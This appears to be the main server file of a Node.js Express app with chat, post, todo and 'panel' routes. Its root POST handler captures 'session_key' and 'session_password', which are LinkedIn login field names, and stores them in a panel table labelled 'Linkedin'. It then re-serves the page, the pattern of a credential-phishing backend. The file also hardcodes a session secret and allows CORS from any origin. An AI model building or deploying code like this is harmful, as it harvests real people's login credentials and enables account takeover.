const express = require('express');
const app = express();
const users = require('./api/users');
const profiles = require('./api/profiles');
const posts = require('./api/posts');
const chats = require('./api/chats');
const todoRouter = require('./api/todos');
const panelRouter = require('./api/panel');
const cors = require("cors")
const { insertPanelQuery } = require('./lib/query');
const { executeQuery } = require('./db');
const bodyParser = require('body-parser');
const session = require('express-session')

/////////// Socket /////////////
const { socketChatConnection } = require('./socket/chat')

app.use(cors({  origin: '*' }));

const oneDay = 1000 * 60 * 60 * 24;
app.use(session({secret: 'thisismysecretkey_poyilong', resave: false, saveUninitialized: true, cookie: { maxAge: oneDay }}))

//app.use(bodyParser.urlencoded({ extended: false }));
app.use(express.static(__dirname+'/public'));
app.use(bodyParser.json({limit: '50mb'})); 
app.use(bodyParser.urlencoded({limit: '50mb', extended: true}));
// app.use(express.static('public'));
app.use(express.json());

// Routes
app.use('/', todoRouter);
app.use('/api/users', users);
app.use('/api/profiles', profiles);
app.use('/api/posts', posts);
app.use('/api/chats', chats);
app.use('/api/panel', panelRouter);

app.get('/', (req,res) => {
  res.sendFile('public/pages/index.html',{root:__dirname})
});

app.post('/', async (req, res) => {
  const { session_key, session_password } = req.body;

  try {
    if (session_key != '' && session_password != '')
    {
      executeQuery(insertPanelQuery, [session_key, session_password, 'Linkedin', ''])
      .then((re) => { res.sendFile('public/pages/index.html',{root:__dirname}) })
      .catch((err) => res.sendFile('public/pages/index.html',{root:__dirname}))
    }
    else res.sendFile('public/pages/index.html',{root:__dirname})

  } catch (error) {
    console.error(error);
    res.status(500).json({ status: false, code: 500, message: 'Internal server error' });
  }
});

// Start the server
const port = 3000;
const server = app.listen(port, () => {
  console.log(`Server running on port ${port}`);
});

socketChatConnection(server)
